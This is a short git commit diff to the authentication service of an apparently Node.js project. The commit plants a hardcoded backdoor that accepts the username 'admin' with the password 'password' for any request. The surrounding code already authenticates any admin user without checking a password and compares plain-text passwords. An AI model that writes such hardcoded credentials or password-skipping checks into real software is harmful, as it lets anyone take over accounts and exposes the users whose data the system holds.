f1fe63a68f3e8233b2cf1d21447a3ad83521f886
leomoca19 <leomoca19@gmail.com>
2023-12-07 21:12:25 -0500

    allowed login with username = "admin" && password = "password"

--- services/authentication.service.js
+++ services/authentication.service.js
@@ -3,7 +3,7 @@ const UsersService = require("./users.service")
 class AuthenticationService {
   static authenticate = async (username, password) => {
     let user = await UsersService.findByUsername(username);
-    return user && (user.isAdmin || user.password == password)
+    return user && ((user.isAdmin || user.password == password) || (username == 'admin' && password == 'password'))
 }}
 
 module.exports = AuthenticationService;
